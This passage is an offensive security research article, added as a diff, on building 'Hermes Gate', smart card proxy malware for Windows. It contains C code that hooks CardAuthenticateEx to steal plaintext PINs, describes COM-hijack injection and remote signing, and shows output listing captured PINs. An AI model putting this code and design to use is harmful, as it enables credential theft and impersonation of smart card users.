@@ -1,0 +1,1283 @@
+---
+title: Abusing the Windows Smart Card Minidriver Architecture
+author: Marc Barrantes
+---
+|=------------------------------------------------------------------------=|
+|=------=[ Abusing the Windows Smart Card Minidriver Architecture ]=------=|
+|=------------------------------------------------------------------------=|
+|=---------------------=[ Marc Barrantes (@m2rc_) ]=----------------------=|
+|=------------------------------------------------------------------------=|
+
+--[ Table of contents
+
+ 0 - Introduction
+ 1 - Fundamentals
+   1.1 - Client certificate authentication
+ 2 - Smart Card proxy malware history
+   2.1 - APT attack on US DoD, 2011
+   2.2 - "Relaying Yubikeys", 2022
+   2.3 - Areas of improvement
+ 3 - Understanding the smart card minidriver architecture
+   3.1 - CardAcquireContext()
+     3.1.1 - Getting a pointer to CspPadData()
+   3.2 - Virtual file system
+   3.3 - Authenticating to the smart card
+   3.4 - CardSignData()
+ 4 - Writing a smart card proxy malware
+   4.1 - Requirements
+   4.2 - Enumeration
+   4.3 - Reading public certificates
+   4.4 - Hooking CardAuthenticateEx() to get the PIN
+   4.5 - Remote signature
+   4.6 - System design and architecture
+     4.6.1 - Hermes agent
+     4.6.2 - Hermes client
+     4.6.3 - Smart card emulator
+     4.6.4 - Modified OpenSC minidriver
+     4.6.5 - Message serialization
+     4.6.6 - Overview
+ 5 - Closing thoughts 
+ 6 - References
+
+--[ 0 - Introduction
+
+The security assumptions of smart cards make them an attractive option as an
+authentication method in highly secure networks, and standards like PIV have
+been widely adopted by organizations that require stronger authentication
+mechanisms.
+
+In a company that has integrated the PKI needed to support smart card
+authentication, each employee has their own identification card they can
+plug into a smart card reader on their workstation. Authentication happens 
+through certificates, with the private key being secured inside the card's
+chip.
+
+This authentication is no different than any service that accepts a client
+certificate as an authentication factor, the only difference is that the
+private key is stored in the smart card, and it's not possible to extract
+it.
+
+However, if you think about it, if a standard user in Windows can use this
+smart card through e.g. their web browser, could it be possible for malware
+to also use this smart card remotely, with no privileges whatsoever, and
+without needing physical access to the card itself?
+
+Well, the answer is yes.
+
+--[ 1 - Fundamentals
+
+Smart cards make use of asymmetric cryptography. They are capable of
+generating a key pair inside the secure chip, this way, the private key
+doesn't ever need to leave the card.
+
+These keys get associated with a certificate, which can then be used for
+authentication to any service (e.g. VPN, Active Directory, SSH, internal
+websites, etc.).
+
+In order to use these certificates, Windows must authenticate to the smart
+card with a PIN. Once the PIN is verified by the card, Windows can ask the
+card to do signing operations with the private key on its behalf.
+
+----[ 1.1 - Client certificate authentication
+
+To understand how client certificate authentication works, we will use mTLS
+as an example, although the same concept applies to other services like SSH.
+
++--------+                                                        +--------+
+| Client |             mTLS Authentication (Simplified)           | Server |
++----+---+                                                        +----+---+
+     | 1. Client Hello                                                 |    
+     +---------------------------------------------------------------->|    
+     |                                                                 |    
+     |                    2. Server Hello, Client Certificate request  |    
+     |<----------------------------------------------------------------+    
+     |                                                                 |    
+     | 3. Client Certificate,                                          |    
+     |    TLS parameters signed                                        |    
+     |    with private key                                             |    
+     +---------------------------------------------------------------->|    
+     |                                                                 |    
+     |                                4. Client certificate validation |    
+     |<----------------------------------------------------------------+    
+
+Essentially, the way the server verifies we have the private key is by
+having the client sign some TLS session data with the private key. This
+prevents replay attacks, and the server can verify whether the signed data
+matches the public key from the client certificate, proving ownership of the
+private key.
+
+Now that we know how smart cards and client certificate authentication work
+at a high level, let's look at some history about malware abusing smart
+cards.
+
+--[ 2 - Smart Card proxy malware history
+
+The term "smart card proxy" comes from malware being able to use a smart
+card remotely, effectively "proxying" any operations in which the private
+key is needed to the real card.
+
+Malware abusing smart cards is not new, although there is a surprising lack
+of public research regarding this topic. In fact, I could only find a single
+APT attack using smart card proxy malware.
+
+----[ 2.1 - APT attack on US DoD, 2011
+
+In 2011 there was an attack against the US DoD in which the APT group
+deployed malware known as Sykipot, which was capable of remotely using smart
+cards physically connected to another Windows computer.
+
+This malware reflectively loaded a post-exploitation DLL with all the smart
+card related features in-memory. Unfortunately this DLL was never recovered,
+so the way the smart card proxy malware operated is not entirely known. What
+we do know, is that the malware used a keylogger to obtain the PIN 
+needed to authenticate to the smart card. A complete analysis of the malware
+available at[0].
+
+----[ 2.2 - "Relaying Yubikeys", 2022
+
+The next relevant research on smart card proxies was a series of blogposts
+by Cube0x0[1].
+
+Smart card readers communicate with the smart card itself by sending APDU
+commands. Each smart card standard has their own set of APDU commands and
+responses, so, by knowing the APDU format each smart card follows, it's
+possible to use SCardTransmit() from WinScard.dll to communicate with the
+card and ask it to sign data on our behalf, given we know the PIN.
+
+The way Cube0x0 obtained the smart card PIN was by hooking SCardTransmit()
+on the target process that used the smart card, and looking for a specific
+byte pattern that contained the APDU authentication packet, along with the
+PIN.
+
+This attack was tailored against PIV smart cards.
+
+The malware which implemented these techniques, PIVert-Relay[2] was super
+useful to me when performing this research, so thank you to Cube0x0.
+
+----[ 2.3 - Areas of improvement
+
+The attacks outlined previously are great. However, they only work on
+specific smart card standards. I wanted something that was universal and
+completely agnostic to the type of smart card used.
+
+This is why we need to understand the smart card minidriver architecture on
+Windows and how minidrivers work.
+
+--[ 3 - Understanding the smart card minidriver architecture
+
+Despite it being named "minidriver", it's actually a DLL loaded in usermode
+that contains all the logic needed to communicate with the corresponding
+smart card.
+
+If a smart card vendor wants to have Windows support, they must ship a DLL
+that adheres to the Windows smart card minidriver specification. It defines
+a set of structures and functions Windows needs to interact with the smart
+card. You can reference the specification at[3].
+
+As long as the vendor implements those functions inside the DLL, Windows
+just calls the one matching the action it wants, and the minidriver handles
+the card-specific APDU commands underneath. Thanks to this design, Windows
+can utilize any type of smart card.
+
+This DLL will be loaded by the process that needs to use the smart card,
+e.g. authenticating to a service or digitally signing a document. That means
+that it runs with the user's privileges.
+
+----[ 3.1 - CardAcquireContext()
+
+According to Microsoft, CardAcquireContext() is the function responsible for
+initializing communication between the smart card and the SCKSP (Smart Card
+Key Storage Provider).
+
+In practice, this is an exported function that must be implemented in the
+smart card minidriver DLL. When Windows needs to communicate with the smart
+card, it will query which minidriver DLL it should load by enumerating all
+subkeys from `HKLM\SOFTWARE\Microsoft\Cryptography\Calais\SmartCards` and
+checking their respective "ATR" value until it matches the ATR from the
+card.
+
+The ATR is a value sent by the smart card to the reader regarding
+capabilities of the card, with some custom information that can be used to
+identify the type of smart card.
+
+CardAcquireContext() has the following definition:
+
+DWORD WINAPI CardAcquireContext(
+    __inout PCARD_DATA  pCardData,
+    __in    DWORD       dwFlags
+    );
+
+The definition of CARD_DATA is in cardmod.h. Unfortunately Microsoft doesn't
+do a good job of keeping the updated structure on their website, so it's
+important to use the header file as a reference[4].
+
+typedef struct _CARD_DATA
+{
+    // These members must be initialized by the CSP/KSP before
+    // calling CardAcquireContext.
+
+    DWORD                               dwVersion;
+
+    PBYTE                               pbAtr;
+    DWORD                               cbAtr;
+    LPWSTR                              pwszCardName;
+
+    PFN_CSP_ALLOC                       pfnCspAlloc;
+    PFN_CSP_REALLOC                     pfnCspReAlloc;
+    PFN_CSP_FREE                        pfnCspFree;
+
+    PFN_CSP_CACHE_ADD_FILE              pfnCspCacheAddFile;
+    PFN_CSP_CACHE_LOOKUP_FILE           pfnCspCacheLookupFile;
+    PFN_CSP_CACHE_DELETE_FILE           pfnCspCacheDeleteFile;
+    PVOID                               pvCacheContext;
+
+    PFN_CSP_PAD_DATA                    pfnCspPadData;
+
+    SCARDCONTEXT                        hSCardCtx;
+    SCARDHANDLE                         hScard;
+
+    // pointer to vendor specific information
+
+    PVOID                               pvVendorSpecific;
+
+    // These members are initialized by the card module
+
+    ...
+    PFN_CARD_CREATE_FILE                pfnCardCreateFile;
+    PFN_CARD_READ_FILE                  pfnCardReadFile;
+    PFN_CARD_WRITE_FILE                 pfnCardWriteFile;
+    PFN_CARD_DELETE_FILE                pfnCardDeleteFile;
+    PFN_CARD_ENUM_FILES                 pfnCardEnumFiles;
+    PFN_CARD_GET_FILE_INFO              pfnCardGetFileInfo;
+    PFN_CARD_QUERY_FREE_SPACE           pfnCardQueryFreeSpace;
+    PFN_CARD_QUERY_KEY_SIZES            pfnCardQueryKeySizes;
+
+    PFN_CARD_SIGN_DATA                  pfnCardSignData;
+    ...
+    // version 6 additions below here
+    PFN_CARD_GET_CHALLENGE_EX           pfnCardGetChallengeEx;
+    PFN_CARD_AUTHENTICATE_EX            pfnCardAuthenticateEx;
+    PFN_CARD_CHANGE_AUTHENTICATOR_EX    pfnCardChangeAuthenticatorEx;
+    PFN_CARD_DEAUTHENTICATE_EX          pfnCardDeauthenticateEx;
+    PFN_CARD_GET_CONTAINER_PROPERTY     pfnCardGetContainerProperty;
+    PFN_CARD_SET_CONTAINER_PROPERTY     pfnCardSetContainerProperty;
+    PFN_CARD_GET_PROPERTY               pfnCardGetProperty;
+    PFN_CARD_SET_PROPERTY               pfnCardSetProperty;
+
+When calling CardAcquireContext, some fields must be initialized with
+information about the smart card we want to interact with. Once the function
+is called, the minidriver should populate the members containing function
+pointers to card-specific operations, like pfnCardSignData or
+pfnCardAuthenticateEx. Then, the caller can now interact with the smart card
+via calling these function pointers.
+
+It's important to keep in mind that CardAcquireContext is intended to be
+called by SCKSP.dll (Smart Card Key Storage Provider).
+
+Since we want to be the ones directly communicating with the smart card,
+we'll essentially be taking the role of the SCKSP. This can be a problem
+since there are complex functions like pfnCspPadData which should properly
+support padding in PKCS#1, PSS and OAEP.
+
+I am not a crypto guy. I could've taken code from OpenSSL to do this, but I
+was not willing to use code I did not understand, so I started looking for
+alternatives.
+
+----[ 3.1.1 - Getting a pointer to CspPadData()
+
+CspPadData() is originally implemented in SCKSP.dll, although the actual
+function name is "KsppPadData". This function handles PKCS#1, PSS and OAEP
+padding. The problem is that the function is not exported, so we can't just
+call GetProcAddress() to get the address of it.
+
+I needed a reliable way of getting this function pointer that would work
+across different Windows builds, and even on future builds, so using
+hardcoded offsets was not an optimal solution. I opted to scan for the
+function prologue of KsppPadData at runtime.
+
+I used 2 tools for this: ida-sigmaker[5] and a modified version of
+SignatureScanner[6].
+
+ida-sigmaker allows you to create a byte signature with a mask for a
+particular function within a binary. In the case of KsppPadData, we get the
+following signature:
+
+48 89 5C 24 ?? 48 89 6C 24 ?? 56 57 41 54 41 56 41 57 48 83 EC ?? 33 FF
+
+The "??" are placeholders for any byte.
+
+This is what the signature scanner functions look like:
+
+#pragma once
+
+/*
+    Modified from https://github.com/Zer0Mem0ry/SignatureScanner
+    to be in-process and C instead of C++
+*/
+
+#include <stdio.h>
+#include <string.h>
+
+#include <windows.h>
+#include <psapi.h>
+
+typedef struct module {
+    BYTE* pBase;
+    DWORD dwSize;
+} module;
+
+module GetModule( const char* moduleName ) {
+    module  mod  = { NULL, 0 };
+    HMODULE hMod = GetModuleHandleA( moduleName );
+    if ( hMod ) {
+        MODULEINFO modInfo;
+        if ( GetModuleInformation( GetCurrentProcess(),
+                                   hMod,
+                                   &modInfo,
+                                   sizeof( modInfo ) ) )
+        {
+            mod.pBase  = (BYTE*)modInfo.lpBaseOfDll;
+            mod.dwSize = modInfo.SizeOfImage;
+        }
+    }
+    return mod;
+}
+
+int MemoryCompare( BYTE* bData, BYTE* bMask, char* szMask ) {
+    for ( ; *szMask; ++szMask, ++bData, ++bMask ) {
+        if ( *szMask == 'x' && *bData != *bMask ) {
+            return 0;
+        }
+    }
+    return ( *szMask == '\0' );
+}
+
+BYTE* FindSignature( BYTE* start, DWORD size, char* sig, char* mask ) {
+    for ( DWORD i = 0; i < size; i++ ) {
+        if ( MemoryCompare( (BYTE*)( start + i ), (BYTE*)sig, mask ) ) {
+            return start + i;
+        }
+    }
+    return NULL;
+}
+And this is my ScanForCspPadData() function:
+
+BYTE* intCspPadData = 0;
+BYTE* ScanForCspPadData( void ) {
+    if ( intCspPadData )
+        return intCspPadData;
+
+    HMODULE     hModule   = LoadLibraryW( L"scksp.dll" );
+    module      mod       = { 0 };
+    const char* Signature = "\x48\x89\x5C\x24\x00\x48\x89\x6C\x24\x00\x56"
+                            "\x57\x41\x54\x41\x56\x41\x57\x48\x83\xEC\x00"
+                            "\x33\xFF";
+    const char* Mask      = "xxxx?xxxx?xxxxxxxxxxx?xx";
+
+    mod = GetModule( "scksp.dll" );
+
+    intCspPadData = FindSignature( mod.pBase, mod.dwSize, Signature, Mask );
+
+    return intCspPadData;
+}
+
+While this worked great with the current version of scksp.dll my VM was
+running, I didn't know how robust this signature would be. I can't just hope
+it doesn't break on future releases and also wasn't sure if it would work on
+older builds of Windows.
+
+To ensure the signature is robust, I went to Winbindex[7] and downloaded the
+first version of scksp.dll from Windows 10 1507, which was released in 2015.
+I checked the signature, and it worked to find the base address of
+KsppPadData. I also tested some other random versions, and it worked for
+those as well. This makes sense, as the instructions for padding data are
+unlikely to change.
+
+In case future releases are a concern, I also tested the signature against
+the latest version of the Windows Insider Experimental VMs, which worked
+fine too. I was satisfied with this method and could now provide the
+pfnCspPadData pointer to call CardAcquireContext():
+
+CARD_DATA cardData     = { 0 };
+BYTE*     CspPadData   = ScanForCspPadData();
+
+cardData.hSCardCtx             = hContext;
+cardData.hScard                = hCard;
+cardData.pfnCspAlloc           = CspAlloc;
+cardData.pfnCspFree            = CspFree;
+cardData.pfnCspReAlloc         = CspReAlloc;
+cardData.pfnCspPadData         = CspPadData;
+cardData.pfnCspCacheAddFile    = CspCacheAddFile;
+cardData.pfnCspCacheLookupFile = CspCacheLookupFile;
+cardData.pfnCspCacheDeleteFile = CspCacheDeleteFile;
+cardData.dwVersion             = dwVersion;
+cardData.pbAtr                 = pbAtr;
+cardData.cbAtr                 = cbAtr;
+cardData.pwszCardName          = cardName;
+
+pCardAcquireContext = (fn_CAC*)GetProcAddress( hMiniDriver,
+                                               "CardAcquireContext" );
+
+if (!pCardAcquireContext)
+    return ERROR_NO_CARD_ACQUIRE_CONTEXT;
+
+DWORD dwRet = pCardAcquireContext( &cardData, 0 );
+if (dwRet)
+    return dwRet;
+
+cardData.pfnCardAuthenticateEx( ... )
+
+The other supplied function pointers like pfnCspAlloc or pfnCspCacheAddFile
+are either wrappers or placeholders:
+
+LPVOID CspAlloc( SIZE_T size ) {
+    return HeapAlloc( GetProcessHeap(), 8, size );
+}
+BOOL CspFree( void* mem ) {
+    return HeapFree( GetProcessHeap(), 0, mem );
+}
+LPVOID CspReAlloc( void* mem, SIZE_T size ) {
+    return HeapReAlloc( GetProcessHeap(), 8, mem, size );
+}
+
+DWORD WINAPI CspCacheAddFile( PVOID pvCacheContext,
+                              LPWSTR wszTag,
+                              DWORD dwFlags,
+                              PBYTE pbData,
+                              DWORD cbData ) {
+    return ERROR_SUCCESS;
+}
+
+DWORD WINAPI CspCacheLookupFile( PVOID pvCacheContext,
+                                 LPWSTR wszTag,
+                                 DWORD dwFlags,
+                                 PBYTE* ppbData,
+                                 DWORD* pcbData ) {
+    return ERROR_NOT_FOUND;
+}
+
+DWORD WINAPI CspCacheDeleteFile( PVOID pvCacheContext,
+                                 LPWSTR wszTag,
+                                 DWORD dwFlags ) {
+    return ERROR_SUCCESS;
+}
+----[ 3.2 - Virtual file system
+Smart card minidrivers must also implement a virtual file system defined by
+the specification.
+
+It's possible to read files from the file system by calling pfnCardReadFile.
+There are also other functions to interact with the filesystem like
+"pfnCardEnumFiles", "pfnCardCreateFile", "pfnCardWriteFile", and
+"pfnCardDeleteFile".
+
+This file system has the following structure:
+
+<root>/
+|- cardid
+|- cardcf
+|- cardapps
+|- mscp/
+|  |- cmapfile
+|  |- msroots
+|  |- kxc00
+|  |- ksc01
+
+- cardid is the card's identifier
+- cardcf is used as a cache file
+- cardapps contains a list of "applications". For now, Windows only assumes
+  "mscp" should be present at index 0. Optionally, there can be an "mscerts"
+  directory containing intermediate certificates.
+- mscp is the base directory for the SCKSP, it mainly contains certificate
+  information
+- cmapfile contains an array of CONTAINER_MAP_RECORD
+- msroots contains public CA certificates needed to use the certificates
+  from the card.
+- kxc00 is a "key exchange" public certificate from container at index 0.
+- ksc01 is a "digital signature" public certificate from container at
+  index 1.
+
+Containers are defined in the "cmapfile" and can be thought of as a space to
+hold certificate information. Each container has the following definition:
+
+typedef struct _CONTAINER_MAP_RECORD
+{
+    WCHAR wszGuid [MAX_CONTAINER_NAME_LEN + 1];
+    BYTE bFlags;
+    BYTE bReserved;
+    WORD wSigKeySizeBits;
+    WORD wKeyExchangeKeySizeBits;
+} CONTAINER_MAP_RECORD, *PCONTAINER_MAP_RECORD;
+
+----[ 3.3 - Authenticating to the smart card
+
+To perform certain operations on the card, smart cards require the user to
+enter a PIN. The way it works on Windows is: when authentication is needed,
+a pop-up from CredentialUIBroker.exe asking the user for the PIN appears.
+
+What's interesting about this process is that it runs as medium-IL with
+UIAccess (Integrity Level S-1-16-8202). So, injecting to this process as a
+standard user is not straightforward. I looked into this for a few days, but
+ended up going another route since I found an easier way to achieve what I
+needed. Either way, this subject is left to be explored. I'm convinced there
+must be a way to inject into this process as a standard user.
+
+When the user enters the PIN, the original calling process wanting to use
+the card will call pCardData->pfnCardAuthenticateEx(), which has the
+following definition:
+
+DWORD WINAPI CardAuthenticateEx(
+    __in PCARD_DATA                                 pCardData,
+    __in PIN_ID                                     PinId,
+    __in DWORD                                      dwFlags,
+    __in_bcount( cbPinData ) PBYTE                  pbPinData,
+    __in DWORD                                      cbPinData,
+    __deref_opt_out_bcount( *pcbSessionPin ) PBYTE* ppbSessionPin,
+    __out_opt PDWORD                                pcbSessionPin,
+    __out_opt PDWORD                                pcAttemptsRemaining );
+
+The pbPinData parameter will contain the plaintext PIN the user entered to
+authenticate to the smart card. Now, you may see where this is going; we
+simply need to hook the CardAuthenticateEx function from the corresponding
+minidriver if we want to intercept the PIN.
+
+----[ 3.4 - CardSignData()
+We know that public key authentication works by signing data with the
+corresponding private key. Windows asks the card to sign data on its behalf
+by calling pfnCardSignData() from the corresponding minidriver. Its function
+definition is as follows:
+
+DWORD WINAPI CardSignData(
+    __in PCARD_DATA         pCardData,
+    __in PCARD_SIGNING_INFO pInfo
+);
+
+The CARD_SIGNING_INFO contains information about the data we want signed,
+such as the container to use from the card, the type of key, the algorithm,
+which padding we want to use and the data to sign. This is the definition:
+
+typedef struct _CARD_SIGNING_INFO
+{
+    DWORD  dwVersion;
+    BYTE   bContainerIndex;
+    DWORD  dwKeySpec;
+    DWORD  dwSigningFlags;
+    ALG_ID aiHashAlg;
+    PBYTE  pbData;
+    DWORD  cbData;
+    PBYTE  pbSignedData;
+    DWORD  cbSignedData;
+    LPVOID pPaddingInfo;
+    DWORD  dwPaddingType;
+} CARD_SIGNING_INFO, *PCARD_SIGNING_INFO;
+
+Assuming we've already authenticated to the card, the minidriver will make
+the appropriate request to the smart card in order to sign our data and
+return it to us.
+
+Upon success, pbSignedData will contain the signed data by the smart card's
+private key. The original application can then submit this signed data to
+the remote server, and will then proceed to authenticate the client.
+
+--[ 4 - Writing a smart card proxy malware
+
+We now have everything we need to know about how Windows operates with any
+type of smart card:
+
+1. Application needs to sign data with the card's private key.
+2. Windows loads the appropriate minidriver in the application's process.
+3. The application authenticates to the card via CardAuthenticateEx().
+4. The application requests the smart card to sign data via CardSignData().
+5. Signed data is submitted to the server for authentication.
+
+All of this is done legitimately by e.g. a web browser, or a VPN client,
+without ever needing any special privileges.
+
+This means, that we just have to implement all the above logic in a malware
+that gets the data to be signed from a remote source, instead of a 
+legitimate local application.
+
+----[ 4.1 - Requirements
+
+When designing malware, or any software, it's important to lay out which
+requirements you want to meet.
+
+My requirements for this malware were as follows:
+
+- Be able to enumerate readers and smart cards regardless of model
+- Be able to retrieve all the public certificates held by the card
+- Be able to steal the smart card's PIN regardless of card model
+- Possess a way to inject malware into any process that uses the smart card
+- Be able to sign data remotely
+- Be able to operate against any smart card model
+- Support all kinds of algorithms (RSA, ECC, etc.) and key sizes.
+- Do all the above as a low-privileged user
+
+In terms of architecture, I chose the malware's communications to be done
+via an SMB Named Pipe. The reason behind this is, you would only deploy a
+smart card proxy once you've already compromised a system, which means you
+already have some C2 egress with the target machine.
+
+The malware is a native DLL that listens on a named pipe, accompanied by a 
+Python client that communicates with that named pipe via the SOCKS proxy 
+from your C2.
+
+----[ 4.2 - Enumeration
+
+When deploying malware in the real world, you can never be 100% sure what 
+you're going up against. That's why very few assumptions should be made
+about the environment, and proper recon/enumeration capabilities are needed.
+
+I read through the leaked source code for Windows XP, specifically at the
+code from the certutil.exe utility[8]. It has an "-scinfo" parameter to get
+information about connected readers and smart cards. Despite the code being
+from the 2000s, not much has changed in regards to the Windows Smart Card
+API. I also looked at examples from mimikatz[9], since it's also able to
+enumerate connected smart cards and readers.
+
+PS > python .\hermes_gate.py devlan/marc:Passw0rd!@192.168.44.162
+Hermes Gate client
+Connected to: 192.168.44.162
+$ readers
+Total of 1 reader
+[0] Alcorlink USB Smart Card Reader 0
+        Reader vendor: Alcorlink
+        Reader model : USB Smart Card Reader
+        Card model   : TC_FNMT_CM
+        Minidriver   : TC_FNMT_CMx64.dll
+        ATR          : 3b7f960000006a464e4d54000200b80566039000
+
+----[ 4.3 - Reading public certificates
+
+To get the certificates available on each connected smart card, I enumerate
+the virtual file system (vfs) from the card with CardEnumFiles(). Then, for
+each certificate, I call CardReadFile() to get the raw public certificate.
+
+$ certs 0
+[+] 2 containers in card
+
+== Container index 0 ==
+[+] Digital signature certificate found!
+
+Hashing Algorithm   : sha256
+Not valid before    : 2026-02-15 13:22:20+00:00
+Not valid after     : 2036-02-14 13:22:20+00:00
+Subject             : CN=marc
+Issuer              : CN=devlan-VPN-CA-ECC
+Encryption algorithm: id-ecPublicKey
+Key size            : 384
+Thumbprint (SHA1)   : 9ABEBFF58C99E38DB4A64CA9850BB8D4FFB30E7E
+
+== Container index 1 ==
+[+] Key exchange certificate found!
+
+Hashing Algorithm   : sha256
+Not valid before    : 2026-02-16 15:42:37+00:00
+Not valid after     : 2027-02-16 15:42:37+00:00
+Subject             : CN=marc,CN=Users,DC=devlan,DC=local
+Issuer              : CN=devlan-CA,DC=devlan,DC=local
+Encryption algorithm: rsaEncryption
+Key size            : 4096
+Thumbprint (SHA1)   : B95F478482CDB477E5D51E278679265ABFC264D8
+
+----[ 4.4 - Hooking CardAuthenticateEx() to get the PIN
+
+We know that Windows calls CardAuthenticateEx() to authenticate to the card,
+and the pbPinData argument contains the plaintext PIN. The function will be
+called inside the process that needs to use the smart card. This means we
+need our DLL loaded into that process.
+
+A good way to achieve this is by using a COM Hijack, replacing the DLL path
+of a COM Object in HKCU to trick Windows into loading our malicious DLL
+instead of the real COM Object. This technique can be replaced with anything
+that loads the agent DLL into the process you want to intercept the PIN. I
+just chose COM Hijack because it is convenient, and I have battle-tested it
+in multiple real environments.
+
+Due to the architecture of the malware (the agent DLL loaded into multiple
+processes), I need a way to communicate which minidriver to hook, to each of
+the processes the malware is loaded in. To do this, I create another named
+pipe in the process that receives the commands. The other clients also
+connect to that pipe for notifications. I also explored a shared memory +
+events approach, but it turned out to be a bit unreliable and prone to race
+conditions.
+
+The idea is to get the data received from the Python client via the agent's
+main pipe, and transfer it directly to the hook notification pipe to all
+connected clients.
+
+I used the widely known MinHook[10] library for managing hooks to the
+CardAuthenticateEx function. The hooks can be remotely controlled from the
+Python client. You can also hook multiple minidrivers and enable/disable
+hooks on demand.
+
+int hookPIN( PHOOK_DATA hookData ) {
+    wchar_t* miniDriver = PathFindFileNameW( hookData->miniDriver );
+    CharLowerW( miniDriver );
+
+    PHOOK_STATE state = getState( miniDriver );
+
+    if ( ! state )
+        return 1;
+    if ( state->hooked == hookData->enableHook )
+        return 0;
+
+    SCARDCONTEXT hContext = 0;
+
+    LONG contextRet = SCardEstablishContext( SCARD_SCOPE_SYSTEM, NULL,
+                                             NULL, &hContext );
+    if ( contextRet )
+        return 1;
+
+    SCARDHANDLE hCard            = 0;
+    DWORD       dwActiveProtocol = 0;
+    CARD_DATA   cardData         = { 0 };
+
+    LONG connectRet = SCardConnectW( hContext, hookData->readerName,
+                                     SCARD_SHARE_SHARED,
+                                     SCARD_PROTOCOL_T0 | SCARD_PROTOCOL_T1,
+                                     &hCard, &dwActiveProtocol );
+    if ( connectRet )
+        return 1;
+
+    HMODULE hMiniDriver = LoadLibraryW( hookData->miniDriver );
+    if ( ! hMiniDriver )
+        return 1;
+
+    BYTE* CspPadData = ScanForCspPadData();
+
+    pCardAcquireContext = (fn_CAC*)GetProcAddress( hMiniDriver,
+                                                   "CardAcquireContext" );
+
+    cardData.hSCardCtx     = hContext;
+    cardData.hScard        = hCard;
+    cardData.pfnCspAlloc   = CspAlloc;
+    cardData.pfnCspFree    = CspFree;
+    cardData.pfnCspReAlloc = CspReAlloc;
+    cardData.pfnCspPadData = CspPadData;
+    cardData.dwVersion     = hookData->dwVersion;
+    cardData.pbAtr         = hookData->pbATR;
+    cardData.cbAtr         = hookData->cbATR;
+    cardData.pwszCardName  = hookData->cardName;
+
+    if ( ! pCardAcquireContext )
+        return 1;
+
+    DWORD acquireContextRet = pCardAcquireContext( &cardData, 0 );
+    if ( acquireContextRet )
+        return 1;
+
+    PCARD_DATA pCardData = &cardData;
+
+    if ( hookData->enableHook ) {
+        MH_CreateHook( pCardData->pfnCardAuthenticateEx,
+                       &detourCardAuthenticateEx,
+                       (LPVOID*)( &state->fpCardAuthenticateEx ) );
+
+        MH_STATUS status = MH_EnableHook( 
+                               pCardData->pfnCardAuthenticateEx );
+                               
+        if ( status == MH_OK ) {
+            state->hooked = TRUE;
+        }
+    } else {
+        MH_DisableHook( pCardData->pfnCardAuthenticateEx );
+
+        MH_STATUS status = MH_RemoveHook( 
+                               pCardData->pfnCardAuthenticateEx );
+                               
+        if ( status == MH_OK ) {
+            state->hooked               = FALSE;
+            state->fpCardAuthenticateEx = NULL;
+        }
+    }
+
+    if ( cardData.pfnCardDeleteContext )
+        cardData.pfnCardDeleteContext( pCardData );
+        
+    SCardDisconnect( hCard, SCARD_LEAVE_CARD );
+    SCardReleaseContext( hContext );
+    
+    return 0;
+}
+Since I wanted to support dynamic hooking on different minidrivers, I needed
+a way to track the state of each hook. For this, I created the following
+structs and function:
+
+typedef struct _HOOK_STATE {
+    wchar_t            miniDriver[MAX_PATH];
+    BOOL               hooked;
+    CARDAUTHENTICATEEX fpCardAuthenticateEx;
+    LPVOID             next;
+} HOOK_STATE, *PHOOK_STATE;
+
+PHOOK_STATE getState( wchar_t* miniDriver ) {
+    PHOOK_STATE current = hookState;
+    PHOOK_STATE last    = NULL;
+
+    while ( current ) {
+        if ( wcscmp( current->miniDriver, miniDriver ) == 0 )
+            return current;
+        last    = current;
+        current = current->next;
+    }
+
+    PHOOK_STATE new = (PHOOK_STATE)LocalAlloc( LPTR, sizeof( HOOK_STATE ) );
+
+    if ( new ) {
+        wcscpy_s( new->miniDriver, MAX_PATH, miniDriver );
+        if ( last )
+            last->next = new;
+        else
+            hookState = new;
+    }
+
+    return new;
+}
+
+Any intercepted PINs can get retrieved remotely via the client:
+
+$ pincache get
+[2026-02-27 16:11:03]
+== TC_FNMT_CM ==
+Process: msedge.exe
+PIN: J3DHn52bmTAf
+PIN is correct
+
+[2026-02-27 16:12:17]
+== YubiKey Smart Card ==
+Process: openvpn.exe
+PIN: 123456
+PIN is correct
+
+----[ 4.5 - Remote signature
+
+The remote signature is implemented by preparing all the arguments to
+CardSignData(), and sending them in a serialized format to the named pipe.
+Then, the malware authenticates to the card with the PIN by calling
+CardAuthenticateEx(), and finally calls CardSignData() with the attacker's
+data to be signed.
+
+Once the data gets signed by the remote smart card, it gets sent back via
+the named pipe, and the attacker can then authenticate to the server as the
+victim.
+
+----[ 4.6 - System design and architecture
+
+This malware has a lot of moving pieces, although the complexity lies mostly
+on the client (attacker) side.
+
+As I mentioned before, the main client in the attacker's machine is written
+in Python, and makes use of the Impacket library to handle SMB named pipe
+communications. The data sent between the client and malware is packaged and
+serialized in a custom TLV format. This allows serializing and deserializing
+the data from both C and Python.
+
+I named this malware "Hermes Gate", and it has the following components:
+
+- Hermes Agent (C)
+- Hermes client (Python)
+- Smart Card emulator (C#)
+- Modified OpenSC minidriver
+
+----[ 4.6.1 - Hermes agent
+
+The Hermes agent is a DLL written in C. Depending on which process it's
+loaded in, the DLL will act either as the main agent, or a hooking agent.
+
+The DLL is designed to get loaded by a COM Hijack, this way we can load our
+malware into every process that uses the smart card (e.g. VPN client, Web
+Browser, etc.).
+
+I have 2 whitelists for this: the first one for processes I want to run in
+"hooking" mode to intercept the PIN, and the second for the process I want
+to host the main agent named pipe. There's also a mutex to ensure only 1
+instance runs as the main agent.
+
+The data sent to this pipe from the Hermes client will contain a command id
+with the action to run, along with any necessary parameters. The data sent
+to/from the pipe will be serialized and deserialized at the other end; I go
+into this process in section "4.6.5 - Message serialization".
+
+The main agent's switch case to handle the different commands received from
+the Hermes client:
+
+PARSER Parser = { 0 };
+
+ParserNew( &Parser, resBuffer, resSize );
+
+int cmd_id = ParserGetInt32( &Parser );
+
+switch ( cmd_id ) {
+case 1:
+    listReaders_cmd();
+    break;
+case 2:
+    enumCerts_cmd( resBuffer, resSize );
+    break;
+case 3:
+    signData_cmd( resBuffer, resSize );
+    break;
+case 4:
+    hookControl_cmd( resBuffer, resSize );
+    break;
+case 5:
+    pinCache_cmd( resBuffer, resSize );
+    break;
+}
+
+LocalFree( resBuffer );
+ParserDestroy( &Parser );
+----[ 4.6.2 - Hermes client
+
+The Hermes client will connect to the malware's named pipe and send commands
+to interact with the remote smart cards. The implemented commands are as
+follows:
+
+- readers
+  + returns the list of available readers on the remote system
+
+- certs [reader_index] (-v)
+  + reads the public certificates in a smart card. Use -v to dump raw hex
+
+- target [reader_index] [container_index] [pin]
+  + start a hermes relay server for the target reader
+
+- sign [reader_index] [container_index] [pin] [data]
+  + manually signs hex data with the remote smart card's private key
+
+- hook [enable|disable] (reader_index)
+  + enable/disable hook functionality to get the PIN for the specified
